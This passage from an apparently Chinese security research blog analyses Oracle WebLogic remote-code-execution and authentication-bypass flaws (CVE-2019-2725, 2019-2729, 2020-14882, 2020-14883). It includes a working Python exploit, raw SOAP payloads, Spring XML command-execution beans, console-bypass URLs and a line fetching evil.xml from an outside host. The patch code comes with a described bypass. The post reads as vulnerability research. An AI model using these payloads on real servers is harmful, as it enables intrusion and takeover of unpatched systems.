10.3.6.0、12.1.3.0</p></blockquote><p><strong>poc</strong></p><blockquote><p>这个漏洞在市面上流传的很多payload都是没有考虑CVE-2017-10271的补丁，直接就是新入口+旧payload，比如&lt;void class=”xxx”&gt;</p><p>真正意义上的对CVE-2017-10271的绕过的关键点在于对&lt;class&gt;标签的利用，即我们可以利用&lt;class&gt;标签来创建任意类的实例</p><p>目前能利用的类有</p><p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</p><p>com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext</p><p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet（version &lt;= 10.36，因为超过这个版本就不存在了）</p></blockquote><p><em>版本 1（ version &lt;= 10.36 ）</em></p><blockquote><p>因为我这里用的是<code>vulhub/weblogic:10.3.6</code>，所以用的是<code>CommonsCollections1</code>的Gadget作为测试，其他情况视具体环境而定</p></blockquote><pre><code class="python">#!/usr/bin/python3import requestsimport reimport sysimport subprocessimport structheaders = &#123;&#39;Content-Type&#39;:&#39;text/xml&#39;&#125;def gen_payload(cmd):    try:        gen_ser = &quot;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &#39;%s&#39;&quot; % cmd        print(&quot;[*] generate CommonsCollections1 payload: %s&quot; % gen_ser)        poc_ser = subprocess.Popen(gen_ser, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()    except Exception as e:        print(&quot;[*] generate CommonsCollections1 payload failed&quot;)        sys.exit(0)    xml = &quot;&quot;&quot;    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;       &lt;soapenv:Header&gt;          &lt;wsa:Action&gt;demoAction&lt;/wsa:Action&gt;          &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;          &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;             &lt;java&gt;                &lt;class&gt;                   &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;                   &lt;void&gt;                      &lt;array class=&quot;byte&quot; length=&quot;%d&quot;&gt;                        %s                      &lt;/array&gt;                   &lt;/void&gt;                &lt;/class&gt;             &lt;/java&gt;          &lt;/work:WorkContext&gt;       &lt;/soapenv:Header&gt;       &lt;soapenv:Body&gt;          &lt;asy:onAsyncDelivery /&gt;       &lt;/soapenv:Body&gt;    &lt;/soapenv:Envelope&gt;    &quot;&quot;&quot;    exploit = &#39;&#39;    _index = 0    for i in poc_ser:        _byte = int.from_bytes(struct.pack(&quot;B&quot;, i), byteorder=&#39;big&#39;, signed=True)        exploit += &quot;&quot;&quot;            &lt;void index=&quot;%d&quot;&gt;                &lt;byte&gt;%d&lt;/byte&gt;            &lt;/void&gt;        &quot;&quot;&quot; % (_index, _byte)        _index += 1    payload = xml % (_index, exploit)    return(payload)def poc(url, cmd):    url += &#39;/_async/AsyncResponseService&#39;    data = gen_payload(cmd)    try:        print(&quot;[*] send payload&quot;)        response = requests.post(url, headers=headers, data=data, verify=False, timeout=5)        if response.status_code == 202:          result = &quot;[+] test ok&quot;          return result        else:          result = &quot;[*] No Vulnerability&quot;    except Exception as e:          result = &#39;[*] error: &#39; + str(e)    return resultif __name__ == &#39;__main__&#39;:    if len(sys.argv) &lt; 3:        print(&quot;python3 poc.py http://127.0.0.1:7001 touch /tmp/success&quot;)        sys.exit(0)    else:        ip = sys.argv[1]        cmd = &#39; &#39;.join(sys.argv[2:])        print(poc(ip, cmd))</code></pre><p><em>版本 2（通杀版本）</em></p><blockquote><p>这个payload执行的前提是支持spel表达式</p></blockquote><pre><code class="http">POST /_async/AsyncResponseService HTTP/1.1Host: 127.0.0.1:7001Content-Type: text/xmlContent-Length: 849&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;   &lt;soapenv:Header&gt;      &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;      &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;      &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;         &lt;java&gt;            &lt;class&gt;               &lt;string&gt;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext&lt;/string&gt;               &lt;void&gt;                  &lt;string&gt;http://127.0.0.1:8000/poc.xml&lt;/string&gt;               &lt;/void&gt;            &lt;/class&gt;         &lt;/java&gt;      &lt;/work:WorkContext&gt;   &lt;/soapenv:Header&gt;   &lt;soapenv:Body&gt;      &lt;asy:onAsyncDelivery /&gt;   &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><pre><code class="xml">// poc.xml&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;  &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;    &lt;constructor-arg&gt;      &lt;list&gt;        &lt;value&gt;cmd&lt;/value&gt;        &lt;value&gt;/c&lt;/value&gt;        &lt;value&gt;&lt;![CDATA[calc]]&gt;&lt;/value&gt;      &lt;/list&gt;    &lt;/constructor-arg&gt;  &lt;/bean&gt;&lt;/beans&gt;</code></pre><p><strong>漏洞分析</strong></p><p>漏洞发生原因是<code>wls9_async_response.war</code>包中的类由于使用注解方法调用了Weblogic原生处理Web服务的类，这个漏洞可以说是对CVE-2017-10271的另一个入口和补丁绕过</p><p>首先我们的漏洞入口在<code>weblogic.wsee.async.AsyncResponseHandler</code>类的<code>handleRequest</code>方法上，设置RelatesTo属性进入else分支</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440e3e017f766fb6a66592c.png" alt="image-20210125225235703"></p><p>一直往下走就会来到<code>weblogic.wsee.server.servlet.SoapProcessor</code>的<code>process()</code>和<code>handlePost()</code>方法，而后会调用WsSkel的<code>invoke()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440d5d936b63cd9392dd39f.png" alt="image-20210126003209680"></p><p>跟进<code>invoke()</code>方法，实例化了ServerDispatcher对象，并调用了<code>dispatch()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714402eae817942a7069a06c6.png" alt="image-20210126003353598"></p><p>在<code>dispatch()</code>方法中，对<code>InternalHandlerList</code>进行<code>setHandlerChain()</code>操作，然后再调用<code>getHandlerChain().handleRequest()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441b32c4ed5ac5b74657213.png" alt="image-20210126003819404"></p><p><code>handleRequest()</code>方法根据handlers列表依次调用每个handler的<code>handleRequest()</code>，但只要某个handler的<code>handleRequest()</code>返回false则直接return，后面handler的<code>handleRequest()</code>将不会被调用</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714410b478e7ac4f3dda1e107.png" alt="image-20210126004609041"></p><p>handlers列表如下，其中有四个需要重点关注的handler，我们需要确保它们能够全部执行，即至少执行到第17个handler</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144100afeeea5b38f6634fda.png" alt="image-20210126005217365"></p><p>在<code>ServerAddressingHandler.handleRequest()</code>中，先关注<code>setWSAVersion()</code>方法</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144190acff0e93c16031c5b0.png" alt="image-20210126005628769"></p><p>其中<code>setWSAVersion()</code>中获取请求中Message的ActionHeader，根据ActionHeader中namespaceURI的不同进行不同的处理，而我们的目的是为了跳过<code>weblogic.wsee.addressing.version</code>的赋值，原因在下</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271441fa1e92c15c1c82618a24.png" alt="image-20210126005838925"></p><p>在<code>validateWSAVersion()</code>函数中，如果<code>weblogic.wsee.addressing.version</code>属性若为空，则设置为<code>WSAVersion.WSA10</code></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210127144232591d48de3c89bd8fae.png" alt="image-20210126010047616"></p><p>回到<code>handleRequest()</code>往下看，当版本号等于<code>WSAVersion.WSA10</code>时var24为true</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442b9f7b3b216175f920672.png" alt="image-20210126010718096"></p><p>继续往下看，判断MsgHeader中的ActionHeader、RelatesToHeader存在则对相应属性进行赋值，同时使var23、var28为true，而var23、var28跟var24直接影响是否抛出异常，如果抛出异常<code>handlers</code>将无法继续往下遍历</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714425c3eb9528db65e68e19d.png" alt="image-20210126010423073"></p><p>下面来到<code>AsyncResponseHandler的handleRequest()</code>，我们需要保证Message的<code>weblogic.wsee.addressing.RelatesTo</code>属性的值为非空，否则会返回false，将导致<code>handlers</code>无法继续往下遍历</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442078b286cbbb2273d9237.png" alt="image-20210126011018421"></p><p>接着来到<code>OperationLookupHandler</code>的<code>handleRequest()</code>，保证Message中的<code>OperationName</code>为非空，否则会抛出异常，令<code>handlers</code>无法继续往下遍历</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714421f820f16703317a92e86.png" alt="image-20210126011223780"></p><p>最后来到<code>WorkAreaServerHandler</code>的<code>handleRequest()</code>，把Header的WorkAreaHeader部分传入<code>WorkContextXmlInputAdapter()</code>进行实例化，然后调用<code>receiveRequest()</code>处理，后面的就和CVE-2017-10271的漏洞分析一样了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442a84d39b0bf88d93ec0f1.png" alt="image-20210126011330536"></p><p><strong>补丁</strong></p><p>增加了对class标签的限制和array中length的大小限制</p><pre><code class="java">private void validate(InputStream is) &#123;   WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory();   try &#123;      SAXParser parser = factory.newSAXParser();      parser.parse(is, new DefaultHandler() &#123;         private int overallarraylength = 0;         public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123;            if (qName.equalsIgnoreCase(&quot;object&quot;)) &#123;               throw new IllegalStateException(&quot;Invalid element qName:object&quot;);            &#125; else if (qName.equalsIgnoreCase(&quot;class&quot;)) &#123; // new               throw new IllegalStateException(&quot;Invalid element qName:class&quot;);             &#125; else if (qName.equalsIgnoreCase(&quot;new&quot;)) &#123;               throw new IllegalStateException(&quot;Invalid element qName:new&quot;);            &#125; else if (qName.equalsIgnoreCase(&quot;method&quot;)) &#123;               throw new IllegalStateException(&quot;Invalid element qName:method&quot;);            &#125; else &#123;               if (qName.equalsIgnoreCase(&quot;void&quot;)) &#123;                  for(int i = 0; i &lt; attributes.getLength(); ++i) &#123;                     if (!&quot;index&quot;.equalsIgnoreCase(attributes.getQName(i))) &#123;                        throw new IllegalStateException(&quot;Invalid attribute for element void:&quot; + attributes.getQName(i));                     &#125;                  &#125;               &#125;               if (qName.equalsIgnoreCase(&quot;array&quot;)) &#123;                  String attClass = attributes.getValue(&quot;class&quot;);                  if (attClass != null &amp;&amp; !attClass.equalsIgnoreCase(&quot;byte&quot;)) &#123;                     throw new IllegalStateException(&quot;The value of class attribute is not valid for array element.&quot;);                  &#125;                  String lengthString = attributes.getValue(&quot;length&quot;);                  if (lengthString != null) &#123;                     try &#123;                        int length = Integer.valueOf(lengthString);                        if (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123; // MAXARRAYLENGTH==10000                           throw new IllegalStateException(&quot;Exceed array length limitation&quot;);                        &#125;                        this.overallarraylength += length;                        if (this.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123;                           throw new IllegalStateException(&quot;Exceed over all array limitation.&quot;);                        &#125;                     &#125; catch (NumberFormatException var8) &#123;</code></pre><h4 id="CVE-2019-2729"><a href="#CVE-2019-2729" class="headerlink" title="CVE-2019-2729"></a>CVE-2019-2729</h4><blockquote><p>Oracle WebLogic Server 10.3.6.0.0、12.1.3.0.0、12.2.1.3.0</p></blockquote><p><strong>工具利用</strong></p><p><a href="https://github.com/ruthlezs/CVE-2019-2729-Exploit">https://github.com/ruthlezs/CVE-2019-2729-Exploit</a></p><pre><code class="shell">python oracle-weblogic-deserialize.py -u http://127.0.0.1:7001 -c &#39;touch /tmp/success&#39;</code></pre><p><strong>漏洞分析</strong></p><p>该漏洞是对CVE-2019-2725的补丁绕过，在jdk7中解析xml时获取element元素的相关类为<code>com.sun.beans.decoder.DocumentHandler</code></p><p>因为在jdk7为array元素添加属性时，只能从length，class，id中选择，而唯一能创建类的class已经被加入了黑名单，所以jdk1.7版本不受此漏洞影响，这次的绕过主要针对低于1.7的jdk版本</p><p>而weblogic1036自带的jdk版本为1.6，jdk1.6中解析xml时有很大差异，相关处理方法在<code>com.sun.beans.ObjectHandler</code>，我们从<code>startElemen()</code>方法入手</p><p>在对标签进行解析时，会对其类、属性和方法进行检查，如果存在就对其进行设置，如果方法不存在，就会生成一个new方法，如果存入<code>forName</code>值的话，我们就可以引入任意类了</p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271442f4b576f32f3d2cd492ab.png" alt="image-20210126170922028"></p><p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271443139fce816fdee93e2625.png" alt="image-20210126172345512"></p><p>所以绕过方法就是使用<code>&lt;array method=&quot;forName&quot;&gt;</code>来代替上面的<code>&lt;class&gt;</code>即可绕过黑名单</p><p><strong>补丁</strong></p><p>使用白名单进行修复</p><p>增加了一层<code>validateFormat</code>过滤，增加白名单限制</p><pre><code class="java">public class WorkContextFormatInfo &#123;    public static final Map&lt;String, Map&lt;String, String&gt;&gt; allowedName = new HashMap();    public WorkContextFormatInfo() &#123;    &#125;    static &#123;        allowedName.put(&quot;string&quot;, (Object)null);        allowedName.put(&quot;int&quot;, (Object)null) ;        allowedName.put(&quot;long&quot;, (Object)null);        Map&lt;String, String&gt; allowedAttr = new HashMap();        allowedAttr.put(&quot;class&quot;, &quot;byte&quot;);        allowedAttr.put(&quot;length&quot;, &quot;any&quot;);        allowedName.put(&quot;array&quot;, allowedAttr);        allowedAttr = new HashMap();        allowedAttr.put(&quot;index&quot;, &quot;any&quot;);        allowedNameput(&quot;void&quot;, allowedAttr);        allowedNameput(&quot;byte&quot;, (Object)null);        allowedName.put(&quot;boolean&quot;, (Object)null);        allowedName.put(&quot;short&quot;, (Object)null);        allowedName.put(&quot;char&quot;, (Object)null);        allowedName.put(&quot;float&quot;, (Object)null);        allowedName.put(&quot;double&quot;, (Object)null) ;        allowedAttr = new HashMap();        allowedAttr.put(&quot;class&quot;, &quot;java.beans.XMLDecoder&quot;) ;        allowedAttr.put(&quot;version&quot;, &quot;any&quot;);        allowedName.put &quot;java&quot;, allowedattr);    &#125;&#125;</code></pre><h4 id="CVE-2020-14882"><a href="#CVE-2020-14882" class="headerlink" title="*CVE-2020-14882"></a>*CVE-2020-14882</h4><blockquote><p>Oracle WebLogic Server  10.3.6.0.0、12.1.3.0.0、12.2.1.3.0、12.2.1.4.0、14.1.1.0.0</p></blockquote><p><strong>poc</strong></p><pre><code class="shell">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal</code></pre><p><strong>漏洞分析</strong></p><p>我们将入口点定义到WebLogic处理Servlet请求的函数当中</p><p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\internal\WebAppServletContext.class#execute</code></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112160713802.png" alt="image-20211112160713802"></p><p>在判断完<code>url</code>非访问<code>/WEB-INF</code>或<code>/META-INF</code>文件时就会执行就下面的<code>securedExecute()</code>函数继续解析</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112160956483.png" alt="image-20211112160956483"></p><p>持续根据就会来到<code>doSecuredExecute()</code>函数，这里的<code>checkAccess()</code>函数会用户进行鉴权操作</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112170050066.png" alt="image-20211112170050066"></p><p>如果我们想要绕过下面的认证就需令这个<code>resourceConstraint</code>变量不为空</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112170102720.png" alt="image-20211112170102720"></p><p><code>getConstraint()</code>函数是用来判断当前<code>url</code>是否在请求静态资源，如果是的话就会放回对应的静态资源列表，其中具体实现如下</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112171248252.png" alt="image-20211112171248252"></p><p>因为这里的<code>this.constraintsMap</code>字典只有一个<code>&quot;&quot;</code>的键值，所以<code>consForAllMethods</code>包含了所有了静态资源列表（列表如下），而<code>consForOneMethod</code>为空，而我们的<code>relURI</code>为<code>/css/%2e%2e%2fconsole.portal</code>，所以<code>rcForAllMethods</code>匹配到了<code>/css/</code>路径，而<code>rcForOneMethod</code>本来就是空，所以根据程序逻辑，我们返回的是不为空的<code>rcForAllMethods</code>变量，从而绕过了认证操作</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112171402107.png" alt="image-20211112171402107" style="zoom:67%;" /><p>接下来调用<code>isAuthorized()</code>函数来判断用户是否认证</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112172240027.png" alt="image-20211112172240027"></p><p><code>isAuthorized()</code>函数内部又调用了<code>checkAccess()</code>来验证用户身份</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112174107658.png" alt="image-20211112174107658"></p><p><code>com.oracle.weblogic.servlet.jar!\weblogic\servlet\security\internal\ChainedSecurityModule.class#checkAccess</code></p><p>然后一直跟进到<code>checkUserPerm()</code>函数检查用户权限</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112174522850.png" alt="image-20211112174522850"></p><p>一直跟进到<code>hasPermission()</code>函数判断用户是否有访问权限</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112221058420.png" alt="image-20211112221058420"></p><p>虽然我们没有<code>AdminMode</code>，但是我们的资源列表<code>/css/*</code>是无需授权的，所以我们的<code>hasPermission()</code>返回的是<code>true</code>，一路跟下来之后<code>checkAccess()</code>函数返回的也是<code>true</code>，最终我们的<code>authorized</code>变量仍旧为<code>true</code></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112221257191.png" alt="image-20211112221257191"></p><p>之后便是跟进到WebLogic从<code>web.xml</code>中的匹配模式找到对应的<code>Servlet</code>来对请求进行处理</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112172827956.png" alt="image-20211112172827956"></p><p>首先我们的<code>*.portal</code>模式对应的<code>servlet-name</code>为<code>AppManagerServlet</code></p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173625448.png" alt="image-20211112173625448" style="zoom:80%;" /><p><code>AppManagerServlet</code>对应的<code>servlet-class</code>为<code>weblogic.servlet.AsyncInitServlet</code></p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112173711206.png" alt="image-20211112173711206" style="zoom:80%;" /><p>根据<code>StubSecurityHelper</code>类的逻辑我们会调用到对应<code>servlet</code>的<code>service()</code>方法</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225039009.png" alt="image-20211112225039009"></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225010994.png" alt="image-20211112225010994"></p><p>在<code>service()</code>函数里，只要<code>url</code>不包含<code>;</code>字符就会调用父类的<code>service()</code>方法</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112163613908.png" alt="image-20211112163613908"></p><p>持续跟进到调用到<code>doGet()</code>函数，然后最终调用的是<code>doPost()</code>函数</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112164009192.png" alt="image-20211112164009192"></p><p>这里会调用<code>createUIContext()</code>函数来获取对应的<code>jspContext</code></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225315294.png" alt="image-20211112225315294"></p><p>调用<code>getTree()</code>返回控件树</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112225810102.png" alt="image-20211112225810102"></p><p>但是在调用<code>getTree()</code>函数时又对<code>pattern</code>进行了一次url解码，这里就是目录穿越的核心</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112230235971.png" alt="image-20211112230235971"></p><p><code>processStream()</code>函数内部使用<code>getMergedControlFromFile()</code>函数从<code>file</code>（即上面<code>pattern</code>）文件中来获取对应的UI控件</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112231103897.png" alt="image-20211112231103897"></p><p>调用<code>getControlFactoryFromFile()</code>函数来读取xml文件<img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116182041346.png" alt="image-20211116182041346"></p><p>最后通过<code>getControlFactoryFromFileWithoutCaching()</code>获取文件内容，即本次目录穿越漏洞的<strong>Sink</strong></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116182239347.png" alt="image-20211116182239347"></p><p><strong>patch</strong></p><pre><code class="java">private static final String[] IllegalUrl = new String[]&#123;&quot;;&quot;, &quot;%252E%252E&quot;, &quot;%2E%2E&quot;, &quot;..&quot;, &quot;%3C&quot;, &quot;%3E&quot;, &quot;&lt;&quot;, &quot;&gt;&quot;&#125;;</code></pre><p>对路径进行校验，但是可以用小写url绕过</p><h4 id="CVE-2020-14883"><a href="#CVE-2020-14883" class="headerlink" title="CVE-2020-14883"></a>CVE-2020-14883</h4><p><strong>poc</strong></p><ol><li><code>ShellSession</code>命令执行（Weblogic 10.3.6无此类）</li></ol><pre><code class="shell">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/success1&#39;);&quot;)</code></pre><ol start="2"><li><code>FileSystemXmlApplicationContext</code>命令执行</li></ol><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;   xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;   xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt;    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot; init-method=&quot;start&quot;&gt;        &lt;constructor-arg&gt;          &lt;list&gt;            &lt;value&gt;bash&lt;/value&gt;            &lt;value&gt;-c&lt;/value&gt;            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;          &lt;/list&gt;        &lt;/constructor-arg&gt;    &lt;/bean&gt;&lt;/beans&gt;</code></pre><pre><code class="shell">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://172.28.164.182:9000/evil.xml&quot;)</code></pre><p><strong>漏洞分析</strong></p><p>继续回到<code>createUIContext()</code>，我们跟进一下<code>setServletRequest()</code>函数</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116183939028.png" alt="image-20211116183939028"></p><p>当传入的<code>_nfpb</code>参数为<code>true</code>时，就会把<code>isPostback</code>设置为<code>true</code></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116184255406.png" alt="image-20211116184255406"></p><p>在创建完控件上下文之后调用<code>runLifecycle()</code>函数进入控件的生命周期</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112230430470.png" alt="image-20211112230430470" style="zoom:80%;" /><p>当<code>isOutBound</code>为<code>false</code>（默认）和<code>isPostback</code>为<code>true</code>时，就会调用<code>runInbound()</code>函数</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116184719698.png" alt="image-20211116184719698"></p><p>在<code>runInbound()</code>函数中会把<code>_inboundLifecycle</code>赋给<code>VisitorType</code>，每个<code>VisitorType</code>对应着该生命周期中的一个控件操作，其中<code>_inboundLifecycle</code>的第一个控件操作为<code>UIControl.init</code></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116185044545.png" alt="image-20211116185044545"></p><blockquote><p>题外，其实这里的<code>_nfpb=true</code>并不是必须的，因为我们的核心是调用到<code>UIControl.init</code>控件操作，而<code>_outboundLifecycle</code>实际也有这个操作</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116192941383.png" alt="image-20211116192941383" style="zoom:80%;" /></blockquote><p>调用<code>walk()</code>来遍历<code>console.portal</code>文件中的控件节点并对其执行<code>VisitorType</code>中对应的操作</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116185335651.png" alt="image-20211116185335651"></p><p>跟进<code>walkRecursive()</code>函数</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112160156084.png" alt="image-20211112160156084"></p><p>当遍历指针<code>visit</code>识别到有节点时就会调用<code>visit()</code>函数执行对应的控件操作</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116190638412.png" alt="image-20211116190638412"></p><p>而这里就是对控件进行初始化</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116191217581.png" alt="image-20211116191217581"></p><p>如果该节点具有子节点就继续调用<code>walkRecursive()</code>函数对子节点进行遍历</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116185825460.png" alt="image-20211116185825460"></p><p>遍历方向如下图所示</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116191101845.png" alt="image-20211116191101845"></p><p>在识别到<code>/PortalConfig/contentheader/ContentHeader_breadcrumbs.portlet</code>节点时，程序会调用<code>Portlet</code>类父类的初始化函数</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211113011922491.png" alt="image-20211113011922491"></p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211113011937480.png" alt="image-20211113011937480"></p><p>其中<code>Portlet</code>类的继承链和<code>init()</code>操作如下</p><pre><code class="java">class Portlet extends class Window    super.init()class Window extends class EntitledUIControl    super.init()class EntitledUIControl extends class AdministeredBackableControl    init() &lt;== not existsclass AdministeredBackableControl    init()</code></pre><p>所以它最终会调用到<code>AdministeredBackableControl</code>的<code>init()</code>函数进行初始化</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160001615.png" alt="image-20211112160001615" style="zoom:80%;" /><p><code>netuix_servlet.jar!\com\bea\netuix\servlets\controls\Backable.class#initializeBackingFile</code></p><p>继续跟进它的<code>init()</code>函数</p><p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112155932230.png" alt="image-20211112155932230"></p><p>这里是获取了我们传入的<code>handle</code>参数</p><img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112155806888.png" 